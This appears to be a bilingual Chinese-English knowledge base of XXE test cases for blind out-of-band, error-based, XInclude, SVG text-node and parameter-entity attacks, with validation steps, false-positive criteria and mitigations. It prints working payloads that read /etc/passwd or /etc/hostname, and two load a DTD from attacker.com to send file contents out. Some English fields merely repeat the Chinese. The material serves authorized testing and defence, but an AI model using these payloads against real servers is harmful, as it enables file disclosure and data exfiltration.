description.zh: 将输出文本、解析器错误、文件访问和出站网络与具体任务对应，排除浏览器渲染和普通图片损坏。
description.en: Correlate output text, parser errors, file access, and egress with the specific job, excluding browser rendering and ordinary image corruption.

title.zh: 统一关闭 XML 外部能力

description.zh: 在所有 SVG 处理阶段关闭外部能力并复测每类结构，确认策略没有只覆盖其中一个解析器。
description.en: Disable external XML capabilities at every SVG processing stage and retest each structure to confirm the policy is not limited to one parser.

overview.zh: 该集合面向会在服务器端解析 SVG XML 的图片检查、缩略图、转码和内容提取组件，包含多种实体与文档结构。浏览器直接显示 SVG 与服务端 XXE 是两个不同边界；只有后端解析器实际展开实体或发起外部请求时才属于本条风险。
overview.en: 该集合面向会在服务器端解析 SVG XML 的图片检查、缩略图、转码和内容提取组件，包含多种实体与文档结构。浏览器直接显示 SVG 与服务端 XXE 是两个不同边界；只有后端解析器实际展开实体或发起外部请求时才属于本条风险。

vulnerability.zh: 根因是图片流水线把 SVG 当作可信 XML，并在具有文件或网络权限的进程中保留 DTD、外部实体或 XInclude 能力。不同库可能先栅格化、先清洗或直接透传，因此必须确定触发解析的具体阶段，不能由 SVG 上传成功推断 XXE。
vulnerability.en: The root cause is treating SVG as trusted XML while retaining DTD, external entity, or XInclude capability in a process with file or network access. Libraries may rasterize, sanitize, or pass through the file, so the exact parsing stage must be identified; upload success does not imply XXE.

exploitation.zh: 1. 绘制上传、查毒、尺寸读取、缩略图和 CDN 发布的处理顺序；2. 在隔离环境提交现有 SVG XXE 变体并为每个任务记录唯一标识；3. 比较无 DOCTYPE、无效实体和合法 SVG。观察证据是转换输出或解析日志包含受控实体标记，或任务发起与标识对应的外连；图片损坏、通用 500 或客户端渲染差异属于假阳性。
exploitation.en: 1. Map the order of upload, scanning, dimension reading, thumbnailing, and CDN publication. 2. Submit the existing SVG XXE variants in isolation with a unique job marker. 3. Compare no-DOCTYPE, invalid-entity, and valid SVG controls. Evidence is a controlled entity marker in transformed output or parser logs, or correlated egress from the job; broken images, generic 500 responses, and client rendering differences are false positives.

mitigation.zh: 1. 对 SVG 禁用 DTD、外部实体、XInclude 和外部样式资源；2. 首选经过安全解析器的位图转码，并丢弃原始主动内容；3. 将图片处理器放入低权限、无网络、只读文件系统沙箱；4. 统一各处理阶段的策略，监控实体错误和出站连接并建立 SVG 变体回归集。
mitigation.en: 1. Disable DTDs, external entities, XInclude, and external style resources for SVG. 2. Prefer safe bitmap transcoding and discard original active content. 3. Run image processors in a low-privilege sandbox with no network and a read-only file system. 4. Align policy across processing stages, monitor entity errors and egress, and keep an SVG variant regression set.

name.zh: Blind XXE 带外实体解析

description.zh: 用于无直接回显的 XML 解析场景，通过授权回调端点确认外部 DTD 或实体是否被服务器解析。
description.en: Targets XML parsing without direct reflection and uses an authorized callback endpoint to confirm external DTD or entity resolution.

prerequisites.zh: 无直接回显的 XML 输入确实进入服务端 parser，外部参数实体/DTD 网络访问未被配置禁止，出站 DNS/HTTP 可审计。
prerequisites.en: 无直接回显的 XML 输入确实进入服务端 parser，外部参数实体/DTD 网络访问未被配置禁止，出站 DNS/HTTP 可审计。

prerequisites.zh: attacker.com 替换为自有令牌化 DTD 端点，DTD 不读取真实文件且只触发一次无内容回调；应用请求和回调共享 token。
prerequisites.en: attacker.com is replaced by an owned tokenized DTD endpoint that reads no real file and triggers one content-free callback, with the application request and callback sharing a token.

title.zh: XXE Blind Out-Of-Band (数据外带)
title.en: Validation step 1 for Blind XXE Out-of-Band Entity Resolution

execution.command:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
%dtd;
]>
<data>&exfil;</data>

description.zh: XXE Blind Out-Of-Band (数据外带)包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Run this Blind XXE Out-of-Band Entity Resolution validation command in an authorized lab, preserve the output, and compare it with the documented baseline.

analysis.zh: 阳性证据是目标解析进程因特定 XML 请求解析外部 DTD/实体并向自有端点发送令牌请求，源 IP、时间、User-Agent 和 parser 日志可关联。 假阳性边界：分析机/扫描器访问 DTD、DNS 预解析、应用普通 URL fetch、WAF 回调、只看到 XML fault、未关联请求或客户端 parser 外连均不是 Blind XXE。
analysis.en: Positive evidence requires the target parser process to resolve the external DTD or entity because of the specific XML request and send a tokenized request to the owned endpoint, correlating source IP, time, user agent, and parser logs. False-positive boundary: DTD access from an analyst or scanner, DNS pre-resolution, an ordinary application URL fetch, a WAF callback, an XML fault alone, an uncorrelated request, or client-parser egress does not prove Blind XXE.

opsecTips.zh: Blind XXE 仅允许一次自有回调，不读取 /etc/passwd 或任何真实文件；出现重复请求、第三方目标、数据进入 URL、重定向或 worker 压力时停止。
opsecTips.en: Blind XXE permits one owned callback only and never reads system or real files; stop on repeated requests, third-party targets, data entering the URL, redirects, or worker pressure.

opsecTips.zh: 关闭 DTD/DNS/HTTP 端点，删除 token/XML/DTD 和回调日志，清理解析队列与缓存，恢复出站和实体解析限制。
opsecTips.en: Close DTD, DNS, and HTTP endpoints, delete tokens, XML, DTDs, and callback logs, clear parser queues and caches, and restore egress and entity-resolution restrictions.

title.zh: 生成单任务回调标识

description.zh: 为本次解析创建不可复用的主机名和路径，并在 DNS、HTTP 和应用日志中预置关联字段。
description.en: Create a nonreusable hostname and path for this parse and prepare correlation fields in DNS, HTTP, and application logs.

title.zh: 提交外部 DTD 样例

description.zh: 运行现有 Blind XXE 输入并记录解析任务开始、结束、工作进程和响应时间。
description.en: Run the existing Blind XXE input and record parse-job start, end, worker process, and response timing.

attackChain.payload:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
%dtd;
]>
<data>&exfil;</data>

title.zh: 关联完整回调路径

description.zh: 只有解析工作进程在时间窗内访问完整唯一实体路径才确认，排除预取器和人工请求。
description.en: Confirm only when the parser worker requests the complete unique entity path within the time window, excluding prefetchers and manual requests.

title.zh: 阻断 resolver 与出站后复测
title.en: Retest after resolver and egress blocking

description.zh: 关闭外部实体并默认拒绝解析容器出站，再使用新标识复测，确认无 DNS 或 HTTP 回调。
description.en: Disable external entities and deny parser-container egress by default, then retest with a new identifier and confirm no DNS or HTTP callback occurs.

overview.zh: Blind XXE 不会在 HTTP 响应中直接显示实体内容，证据来自解析任务向受控域发出的 DNS 或 HTTP 请求。测试必须使用唯一随机子域、严格时间窗和应用日志关联，否则扫描器、预取、邮件安全网关或其他服务访问同一域都可能造成误判。
overview.en: Blind XXE does not reflect entity content in the HTTP response. Evidence comes from DNS or HTTP requests made by the parsing job to a controlled domain. Use a unique random subdomain, strict time window, and application-log correlation because scanners, prefetchers, mail gateways, and other services can otherwise cause false positives.

vulnerability.zh: 根因是 XML 解析器允许外部参数实体或外部 DTD，并且处理进程拥有出站网络能力。请求发生可能早于或晚于前端响应，代理也可能代为解析 URL；因此仅收到一次回调不足以确认，必须匹配任务 ID、来源网络和实体路径。
vulnerability.en: The root cause is an XML parser that allows external parameter entities or external DTDs while the processing service has egress. Requests may occur before or after the frontend response, and a proxy may inspect URLs, so one callback is insufficient without matching the job ID, source network, and entity path.

exploitation.zh: 1. 为单次解析生成唯一随机回调主机和路径并记录开始/结束时间；2. 提交现有 Blind XXE 样例，同时采集应用任务、DNS、HTTP 和出站代理日志；3. 用普通 URL 字符串、禁用 DTD 和不存在域作对照。观察证据是解析任务在时间窗内请求完整唯一实体路径；安全网关预取、人工访问和无任务关联的 DNS 查询属于假阳性。
exploitation.en: 1. Generate a unique random callback host and path for one parse job and record the time window. 2. Submit the existing Blind XXE sample while collecting application job, DNS, HTTP, and egress-proxy logs. 3. Compare a plain URL string, DTD-disabled input, and a nonexistent domain. Evidence is a request for the complete unique entity path from the parsing job within the window; security-gateway prefetch, manual visits, and uncorrelated DNS are false positives.

mitigation.zh: 1. 禁用外部 DTD 与参数实体并提供拒绝外部 URI 的 resolver；2. 对解析容器实施默认拒绝出站网络，仅开放明确业务目标；3. 使用低权限与只读文件系统降低回调后可访问范围；4. 记录解析任务、DOCTYPE、DNS/HTTP 出站和 resolver 拒绝事件并建立 OOB 回归测试。
mitigation.en: 1. Disable external DTDs and parameter entities and use a resolver that rejects external URIs. 2. Deny egress by default for parser containers and allow only explicit business destinations. 3. Use low privilege and a read-only file system to reduce accessible scope. 4. Correlate parse jobs, DOCTYPE use, DNS and HTTP egress, and resolver denials and maintain OOB regression tests.

name.zh: 基于解析错误的 XXE 证据回显

description.zh: 验证 XML 解析错误是否会携带由外部 DTD 组合出的受控内容，并区分真实实体访问与普通错误堆栈。
description.en: Verifies whether XML parse errors carry controlled content composed by an external DTD and distinguishes entity access from ordinary stack traces.

prerequisites.zh: XML parser 会获取外部 DTD，应用会把 parser exception 的受控部分返回或记录到可观察但授权的错误通道。
prerequisites.en: The XML parser fetches an external DTD, and the application returns or logs a controlled part of parser exceptions through an observable authorized error channel.

prerequisites.zh: 自有 error.dtd 仅把固定 marker 组合进无害的不存在 URI/实体错误，保存 DTD token、parser 日志、HTTP 响应和异常链。
prerequisites.en: An owned error.dtd places only a fixed marker into a harmless nonexistent URI or entity error, preserving DTD token, parser logs, HTTP response, and exception chain.

title.zh: XXE Error-based (通过错误消息获取数据)
title.en: Validation step 1 for Error-Based XXE Evidence Reflection

description.zh: XXE Error-based (通过错误消息获取数据)包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Run this Error-Based XXE Evidence Reflection validation command in an authorized lab, preserve the output, and compare it with the documented baseline.

analysis.zh: 阳性证据是目标 parser 获取 DTD、展开 marker 并在同一请求的异常文本中返回该 marker；如涉及文件内容，必须另有专用 marker 文件审计。 假阳性边界：普通 XML stack trace、DTD URL 出现在错误、固定错误模板、分析端拼接 marker、仅外部回调或不同请求的异常均不能证明错误型实体展开。
analysis.en: Positive evidence requires the target parser to fetch the DTD, expand the marker, and return it in exception text for the same request; any file-content claim additionally needs dedicated marker-file audit. False-positive boundary: An ordinary XML stack trace, a DTD URL in errors, a fixed error template, analyst-side marker construction, an external callback alone, or an exception from another request does not prove error-based entity expansion.

opsecTips.zh: 错误型 XXE 每轮只制造一次可控错误，不使用真实路径或大内容；出现敏感错误回显、日志洪泛、监控告警、重试风暴或服务降级时停止。
opsecTips.en: Error-based XXE creates one controlled error per run and uses no real paths or large content; stop on sensitive error reflection, log flooding, monitoring alerts, retry storms, or service degradation.

opsecTips.zh: 关闭 DTD endpoint，删除 XML/token/marker 和错误日志副本，清理告警/重试队列，恢复统一错误处理与实体限制。
opsecTips.en: Close the DTD endpoint, delete XML, tokens, markers, and error-log copies, clear alert and retry queues, and restore uniform error handling and entity restrictions.

title.zh: 准备无害错误标记资源

description.zh: 创建只含随机标记的本地测试资源和一次性外部 DTD，记录解析任务关联信息。
description.en: Create a local test resource containing only a random marker and a one-time external DTD and record parse-job correlation data.

title.zh: 触发实体组合错误

description.zh: 提交现有错误型 XXE 输入，同时采集客户端、服务端和 resolver 的完整错误链。
description.en: Submit the existing error-based XXE input while collecting the complete client, server, and resolver error chain.

attackChain.payload:
<!ENTITY % dtd SYSTEM "http://attacker.com/error.dtd">
%xxe;
%payload;
%remote;
<data>test</data>

title.zh: 匹配任务与唯一标记
title.en: Match the job and unique marker

description.zh: 只有同一任务的实体异常包含唯一标记才确认，排除通用错误页、固定堆栈和代理生成内容。
description.en: Confirm only when the entity exception for the same job contains the unique marker, excluding generic error pages, fixed stacks, and proxy-generated content.

title.zh: 关闭详细错误与实体后复测
title.en: Retest after disabling entities and detailed errors

description.zh: 关闭外部实体、统一客户端错误并重放样例，确认日志受控且响应不再泄露实体信息。
description.en: Disable external entities, standardize client errors, and replay the sample to confirm logs remain controlled and responses no longer expose entity information.

overview.zh: 错误型 XXE 利用解析器在处理无效资源 URI 或嵌套实体时把构造后的值写入异常消息，适用于正常响应不回显实体的场景。它高度依赖解析器错误格式、是否加载外部 DTD 以及应用是否向客户端暴露详细错误。
overview.en: Error-based XXE relies on a parser placing a composed value into an exception while resolving an invalid resource URI or nested entity. It applies when normal responses do not reflect entities and depends heavily on parser error formatting, external-DTD loading, and whether detailed errors reach the client.

vulnerability.zh: 根因包含两层：解析器允许外部实体/DTD，应用又暴露包含敏感 URI 的详细异常。单个“找不到文件”或远程 DTD 请求只能证明部分条件；必须使用无害随机标记确认该标记经过实体组合进入同一解析任务的错误信息。
vulnerability.en: The root cause has two layers: the parser permits external entities or DTDs, and the application exposes detailed exceptions containing a sensitive URI. A missing-file error or remote DTD request proves only part of the chain; a harmless random marker must pass through entity composition into the error for the same parse job.

exploitation.zh: 1. 在隔离环境准备仅含随机标记的测试资源和唯一外部 DTD；2. 提交现有错误型样例并收集客户端响应、服务端异常、resolver 和任务日志；3. 比较不存在资源、普通语法错误和关闭详细错误三种对照。观察证据是唯一标记出现在与任务一致的实体解析异常；通用堆栈、固定路径和代理错误页属于假阳性。
exploitation.en: 1. In isolation, prepare a test resource containing only a random marker and a unique external DTD. 2. Submit the existing error-based sample and collect client response, server exception, resolver logs, and job logs. 3. Compare missing-resource, ordinary syntax-error, and detailed-error-disabled controls. Evidence is the unique marker in an entity-resolution exception for the same job; generic stacks, fixed paths, and proxy error pages are false positives.

mitigation.zh: 1. 禁用所有外部实体和 DTD，并以拒绝外部 URI 的 resolver 兜底；2. 生产环境返回统一错误标识，不向客户端暴露解析器路径和异常细节；3. 将详细异常保留在受控日志并进行敏感字段脱敏；4. 监控 DOCTYPE、外部 DTD 和实体错误频率并添加错误型 XXE 回归测试。
mitigation.en: 1. Disable all external entities and DTDs and use a resolver that rejects external URIs. 2. Return a uniform error identifier in production without parser paths or exception details. 3. Keep detailed exceptions only in controlled logs with sensitive-field redaction. 4. Monitor DOCTYPE, external-DTD, and entity-error frequency and add error-based XXE regression tests.

name.zh: XInclude 外部资源包含

description.zh: 验证 XML 解析流程是否显式执行 XInclude，从而在没有可控 DOCTYPE 的情况下读取外部文本资源。
description.en: Verifies whether an XML pipeline explicitly processes XInclude and can read an external text resource without a controllable DOCTYPE.

prerequisites.zh: 目标 XML 处理流程显式调用 XInclude 处理（如 xinclude()/setXIncludeAware），并允许 parse=text 的外部 href。
prerequisites.en: The target XML flow explicitly invokes X Include processing, such as xinclude () or set X Include Aware, and permits external href values with parse=text.

prerequisites.zh: xi:include 只引用 parser 沙箱内固定 marker，保存 XInclude 开关、resolver 调用、文件审计、包含前后 DOM 和请求 ID。
prerequisites.en: xi:include references only a fixed marker inside the parser sandbox, preserving XInclude settings, resolver calls, file audit, DOM before and after inclusion, and request identifier.

title.zh: XXE XInclude (不需要控制XML根元素)
title.en: Validation step 1 for XInclude External Resource Inclusion

description.zh: XXE XInclude (不需要控制XML根元素)包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Run this XInclude External Resource Inclusion validation command in an authorized lab, preserve the output, and compare it with the documented baseline.

analysis.zh: 阳性证据是应用显式 XInclude 阶段解析 href、读取 marker 并将文本节点插入最终 XML 模型；无需也不依赖 DOCTYPE。 假阳性边界：XML namespace/xi 标签被 parser 接受但未执行 XInclude、href 字符串存在、文件错误、客户端工具包含成功或外部实体已禁用都不能判断 XInclude。
analysis.en: Positive evidence requires the application's explicit XInclude phase to resolve href, read the marker, and insert its text into the final XML model without relying on a DOCTYPE. False-positive boundary: Parser acceptance of the namespace or xi tag without executing XInclude, an href string, file errors, successful inclusion in a client tool, or disabled external entities does not prove XInclude processing.

opsecTips.zh: XInclude 测试只包含一个短 marker，禁止真实文件、递归 include、fallback 链和远程 URL；出现外连、扩张、文件泄露或 parser 异常时停止。
opsecTips.en: XInclude testing includes one short marker only and forbids real files, recursive includes, fallback chains, and remote URLs; stop on egress, expansion, file disclosure, or parser anomalies.

opsecTips.zh: 删除 XML/marker 和包含后产物，清理 resolver/parser 缓存与日志，恢复 XInclude 禁用或 href allowlist 后回归。
opsecTips.en: Delete XML, markers, and post-inclusion artifacts, clear resolver and parser caches and logs, restore disabled XInclude or href allowlists, and regress.

title.zh: 确认 XInclude 处理开关

description.zh: 通过安全 fallback 或授权文本资源判断目标是否实际执行 XInclude，而不是只接受命名空间。
description.en: 通过安全 fallback 或授权文本资源判断目标是否实际执行 XInclude，而不是只接受命名空间。

title.zh: 提交 parse=text 包含样例

description.zh: 在隔离解析流程运行现有 XInclude 输入，并记录最终 URI、resolver 日志和解析结果。
description.en: Run the existing XInclude input in an isolated parser and record the final URI, resolver logs, and parsed result.

attackChain.payload:
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/>
</foo>

title.zh: 用禁用与错误命名空间对照

description.zh: 分别关闭 XInclude、修改命名空间和使用不存在资源，确认唯一标记只在真实包含时出现。
description.en: Disable XInclude, alter the namespace, and use a missing resource to confirm that the unique marker appears only after real inclusion.

title.zh: 移除 XInclude 或限制 resolver
title.en: Remove XInclude or restrict the resolver

description.zh: 关闭处理开关或设置资源白名单后重放样例，确认正常 XML 仍可处理且外部文本不再包含。
description.en: Disable the processing switch or apply a resource allowlist, then replay the sample to confirm normal XML works and external text is no longer included.

overview.zh: XInclude 与 DTD 外部实体是不同机制：输入通过 `xi:include` 引用资源，只有应用或解析库显式执行 XInclude 处理时才会加载。它适用于无法控制完整 XML 文档头、但能注入元素的场景，因此测试必须先确认目标流水线启用了 XInclude。
overview.en: XInclude is distinct from DTD external entities. Input references a resource through `xi:include`, and loading occurs only when the application or library explicitly performs XInclude processing. It is relevant when the document prolog is not controllable but element injection is possible, so XInclude support must be confirmed first.

vulnerability.zh: 根因是应用对不可信 XML 调用 XInclude 展开，同时 resolver 可访问 file 或网络 URI。很多解析器默认不处理 XInclude，普通命名空间被接受也不代表包含已执行；必须观察受控资源进入解析结果或相关 resolver 日志。
vulnerability.en: The root cause is invoking XInclude expansion on untrusted XML while the resolver can access file or network URIs. Many parsers do not process XInclude by default, and acceptance of the namespace does not mean inclusion occurred. A controlled resource in output or corresponding resolver logs is required.

exploitation.zh: 1. 先用内联 fallback 或授权 HTTP 文本确认目标是否执行 XInclude；2. 在隔离环境提交现有 `xi:include parse="text"` 样例并记录解析输出；3. 比较禁用 XInclude、错误命名空间和不存在资源。观察证据是预置随机标记进入结果且 resolver 记录匹配；元素原样保留、命名空间可解析或普通文件错误属于假阳性。
exploitation.en: 1. 先用内联 fallback 或授权 HTTP 文本确认目标是否执行 XInclude；2. 在隔离环境提交现有 `xi:include parse="text"` 样例并记录解析输出；3. 比较禁用 XInclude、错误命名空间和不存在资源。观察证据是预置随机标记进入结果且 resolver 记录匹配；元素原样保留、命名空间可解析或普通文件错误属于假阳性。

mitigation.zh: 1. 不对不可信 XML 调用 XInclude 处理；2. 必须使用时采用严格资源白名单和拒绝 file/私网/远程 URI 的 resolver；3. 在无网络、低权限、最小文件视图的容器中解析；4. 记录 XInclude 元素、解析后的最终 URI 和拒绝事件并增加回归测试。
mitigation.en: 1. Do not invoke XInclude processing for untrusted XML. 2. If required, use a strict resource allowlist and a resolver that rejects file, private-network, and remote URIs. 3. Parse in a no-network, low-privilege container with a minimal file view. 4. Log XInclude elements, final resolved URIs, and denials and add regression tests.

name.zh: SVG 文本节点外部实体回显

description.zh: 验证服务端 SVG 解析或栅格化时是否把外部实体展开到 text 节点及其派生输出。
description.en: 验证服务端 SVG 解析或栅格化时是否把外部实体展开到 text 节点及其派生输出。

prerequisites.zh: 服务端 SVG parser 或栅格化器解析 DOCTYPE 与 text 节点，输出可通过文档模型、文本提取或图像预览观察。
prerequisites.en: 服务端 SVG parser 或栅格化器解析 DOCTYPE 与 text 节点，输出可通过文档模型、文本提取或图像预览观察。

prerequisites.zh: 实体只指向 worker 沙箱内固定短 marker，记录 SVG 上传 ID、解析进程文件审计、text 节点值与派生预览/OCR。
prerequisites.en: The entity points only to a short fixed marker inside the worker sandbox, recording SVG upload identifier, parser-process file audit, text-node value, and derived preview or OCR.

title.zh: XXE SVG文件上传 (通过图片上传触发XXE)
title.en: Validation step 1 for SVG Text-Node External Entity Reflection

execution.command:
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
<text font-size="16" x="0" y="16">&xxe;</text>
</svg>

description.zh: XXE SVG文件上传 (通过图片上传触发XXE)包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Run this SVG Text-Node External Entity Reflection validation command in an authorized lab, preserve the output, and compare it with the documented baseline.

analysis.zh: 阳性证据是服务端解析进程读取 marker 并把其内容展开到 SVG text 节点，随后在解析树或派生输出中可验证，任务链一致。 假阳性边界：浏览器端显示 marker、源 XML 有实体、预览仅显示实体名/空白、客户端 SVG viewer 展开、OCR 偶然匹配或文件错误都不是服务端读取。
analysis.en: 阳性证据是服务端解析进程读取 marker 并把其内容展开到 SVG text 节点，随后在解析树或派生输出中可验证，任务链一致。 假阳性边界：浏览器端显示 marker、源 XML 有实体、预览仅显示实体名/空白、客户端 SVG viewer 展开、OCR 偶然匹配或文件错误都不是服务端读取。

opsecTips.zh: SVG text XXE 只读无敏感 marker；出现真实文件、外连、图像尺寸/内存异常、OCR 队列积压、worker 崩溃或输出扩散时停止。
opsecTips.en: SVG text-node XXE reads a nonsensitive marker only; stop on real files, egress, image-size or memory anomalies, OCR backlog, worker crashes, or output propagation.

opsecTips.zh: 删除 SVG、marker、解析树/预览/OCR 产物，清理图像任务队列和缓存，重启隔离 parser/rasterizer。
opsecTips.en: Delete SVGs, markers, parse trees, previews, and OCR artifacts, clear image job queues and caches, and restart isolated parsers or rasterizers.

title.zh: 准备文本节点标记

description.zh: 在隔离任务目录创建只含随机无害标记的文件，并记录正常 SVG 文本节点输出基线。
description.en: Create a file containing only a random harmless marker in the isolated job directory and record the baseline for a normal SVG text node.

title.zh: 运行最小 SVG 实体输入
title.en: Run the minimal SVG entity input

description.zh: 提交现有 text 节点 XXE 样例并触发服务器实际使用的预览、OCR 或栅格化动作。
description.en: 提交现有 text 节点 XXE 样例并触发服务器实际使用的预览、OCR 或栅格化动作。

attackChain.payload:
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
<text font-size="16" x="0" y="16">&xxe;</text>
</svg>

title.zh: 检查派生输出与访问日志
title.en: Inspect derived output and access logs

description.zh: 将派生图片、OCR 文本、抽取内容和解析器文件访问关联到同一任务，排除原始源码回显。
description.en: Correlate derived image, OCR text, extracted content, and parser file access with the same job, excluding raw-source reflection.

title.zh: 净化或转码后复测

description.zh: 关闭实体解析并只保留安全位图后重复样例，确认随机标记不再进入任何派生结果。
description.en: Disable entity resolution, retain only a safe bitmap, and repeat the sample to confirm the marker no longer reaches any derived output.

overview.zh: 该条聚焦最小 SVG 文本节点：实体值被放入 `<text>` 后，可能在预览、栅格图、OCR 或抽取文本中留下证据。与大型 SVG 变体集合相比，它更适合判断单一解析器是否展开实体，也便于使用无害标记控制输出。
overview.en: This entry focuses on a minimal SVG text node. If an entity expands into `<text>`, evidence may appear in preview, raster output, OCR, or extracted text. Compared with broad SVG variant sets, it better isolates whether one parser resolves entities and supports harmless marker controls.

vulnerability.zh: 根因是服务端图片组件把 SVG 作为普通 XML 解析并允许 DTD/外部实体，同时转换进程可访问目标资源。浏览器显示 `<text>`、SVG 源码包含实体声明或图片尺寸读取成功都不等于实体已展开，必须检查派生输出或解析日志。
vulnerability.en: 根因是服务端图片组件把 SVG 作为普通 XML 解析并允许 DTD/外部实体，同时转换进程可访问目标资源。浏览器显示 `<text>`、SVG 源码包含实体声明或图片尺寸读取成功都不等于实体已展开，必须检查派生输出或解析日志。

exploitation.zh: 1. 在隔离转换容器准备仅含随机主机名的测试文件；2. 提交现有最小 SVG 样例并触发实际预览或栅格化；3. 比较无 DOCTYPE、字面文本和不存在资源三个版本。观察证据是随机标记出现在派生图像/OCR/文本或实体访问日志；仅原始源码可见、图片破损或浏览器渲染属于假阳性。
exploitation.en: 1. Prepare a test file containing only a random hostname in an isolated converter. 2. Submit the existing minimal SVG sample and trigger the real preview or rasterization. 3. Compare no-DOCTYPE, literal-text, and missing-resource versions. Evidence is the marker in derived image, OCR, text, or entity-access logs; visible source, broken images, and browser rendering are false positives.

mitigation.zh: 1. 在 SVG/XML 解析器中禁用 DOCTYPE 和外部实体；2. 将原始 SVG 清洗或栅格化，后续仅使用净化产物；3. 让转换器无网络、低权限并只能读取任务目录；4. 对文本节点实体声明、解析异常和派生输出建立自动回归测试。
mitigation.en: 1. Disable DOCTYPE and external entities in SVG and XML parsers. 2. Sanitize or rasterize original SVG and use only sanitized output downstream. 3. Run converters without network, with low privilege, and with access only to the job directory. 4. Add automated regression tests for entity declarations in text nodes, parser exceptions, and derived output.

name.zh: XXE 参数实体与内部 DTD 注入
name.en: XXE Parameter Entity and Internal DTD Injection

description.zh: 验证 XML 解析器是否展开参数实体并将其带入后续实体声明，从而越过预期的 XML 数据边界。
description.en: Verifies whether an XML parser expands parameter entities into later declarations and crosses the intended XML data boundary.

prerequisites.zh: XML parser 允许内部 DTD 和参数实体，实体声明片段会被组合进同一有效文档，具体解析 API 与配置可观察。
prerequisites.en: The XML parser permits internal DTDs and parameter entities, and declaration fragments are combined into one valid document, with exact parser API and configuration observable.

prerequisites.zh: 参数实体只引用 parser 沙箱内固定 marker 或自有空 DTD，保存完整 XML、实体解析器回调、文件审计和解析结果。
prerequisites.en: Parameter entities reference only a fixed marker inside the parser sandbox or an owned empty DTD, preserving complete XML, entity-resolver callbacks, file audit, and parse result.

title.zh: XXE参数实体绕过
title.en: Validation step 1 for XXE Parameter Entity and Internal DTD Injection

description.zh: XXE参数实体绕过包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Run this XXE Parameter Entity and Internal DTD Injection validation command in an authorized lab, preserve the output, and compare it with the documented baseline.

analysis.zh: 阳性证据是目标 parser 展开参数实体并让其内容参与后续实体声明，最终 marker 出现在元素值或解析回调中，解析链连续。 假阳性边界：单独提交三行导致语法错误、DOCTYPE 被识别但实体禁用、实体名原样保留、路径出现在错误、普通内部实体展开或客户端 parser 行为均不是参数实体 XXE。
analysis.en: Positive evidence requires the target parser to expand the parameter entity and use its content in a subsequent entity declaration, placing the marker in an element value or parser callback with a continuous parse chain. False-positive boundary: Syntax errors from submitting fragments separately, recognized DOCTYPE with entities disabled, literal entity names, paths in errors, ordinary internal-entity expansion, or client-parser behavior does not prove parameter-entity XXE.

opsecTips.zh: 参数实体测试限制一个短 marker，禁止递归/指数实体和真实文件；出现外连、实体扩张、内存/CPU 增长、真实内容或 parser 崩溃时停止。
opsecTips.en: Parameter-entity testing uses one short marker and forbids recursive or exponential entities and real files; stop on egress, entity expansion, memory or CPU growth, real content, or parser crash.

opsecTips.zh: 删除 XML/DTD/marker 和解析产物，清理 parser/应用缓存与错误日志，恢复禁用 DTD/外部实体配置并重启 worker。
opsecTips.en: Delete XML, DTD, markers, and parse artifacts, clear parser and application caches plus error logs, restore disabled DTD and external-entity settings, and restart workers.

title.zh: 确认 DTD 与参数实体支持

description.zh: 使用无外部资源的最小 DTD 判断解析器是否处理参数实体，并记录解析器实现与配置。
description.en: 使用无外部资源的最小 DTD 判断解析器是否处理参数实体，并记录解析器实现与配置。

title.zh: 运行参数实体组合样例

description.zh: 在隔离解析器中提交现有实体声明集合，观察参数实体是否进入后续声明和文档输出。
description.en: Submit the existing declaration set to an isolated parser and observe whether the parameter entity reaches later declarations and document output.

attackChain.payload:
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY test "%xxe;">
<data>&test;</data>

title.zh: 以未声明实体排除普通错误
title.en: Use an undeclared entity as an error control

description.zh: 比较未声明实体、禁用 DTD 和不存在资源的错误类别，只有唯一标记展开才确认能力。
description.en: Compare error classes for an undeclared entity, disabled DTD, and a missing resource; confirm capability only when the unique marker expands.

title.zh: 关闭实体能力并回归

description.zh: 在解析器工厂和 resolver 双层禁用后重放样例，确认正常 XML 可解析而参数实体被拒绝。
description.en: Disable entities at both parser-factory and resolver layers, replay the sample, and confirm normal XML parses while the parameter entity is rejected.

overview.zh: 参数实体只在 DTD 中使用，常用于组合外部 DTD、普通实体或错误链。该条用于确认解析器是否接受 DTD、是否展开 `%name;` 以及展开结果能否影响文档内容；它不是简单的 XML 标签注入，也不应仅凭 DOCTYPE 被接受确认 XXE。
overview.en: 参数实体只在 DTD 中使用，常用于组合外部 DTD、普通实体或错误链。该条用于确认解析器是否接受 DTD、是否展开 `%name;` 以及展开结果能否影响文档内容；它不是简单的 XML 标签注入，也不应仅凭 DOCTYPE 被接受确认 XXE。

vulnerability.zh: 根因是解析器允许 DTD 和参数实体，并且实体解析器可访问本地或远程资源。部分库会允许内部 DTD 但禁止外部实体，部分会延迟到验证阶段；因此需要通过受控标记、解析日志和对照文档确认具体能力，而不是依赖通用报错。
vulnerability.en: The root cause is a parser that permits DTDs and parameter entities while its resolver can access local or remote resources. Some libraries allow internal DTDs but block external entities, while others defer resolution until validation. Controlled markers, parser logs, and control documents are required instead of generic errors.

exploitation.zh: 1. 提交不含外部资源的内部参数实体，确认 DTD 和 `%name;` 是否被解析；2. 在隔离环境运行现有参数实体样例并记录实体声明、输出和解析日志；3. 使用禁用 DTD、未声明实体和不存在资源作为对照。观察证据是参数实体展开后的唯一标记进入文档结果；单纯“实体未定义”或 XML 格式错误属于假阳性。
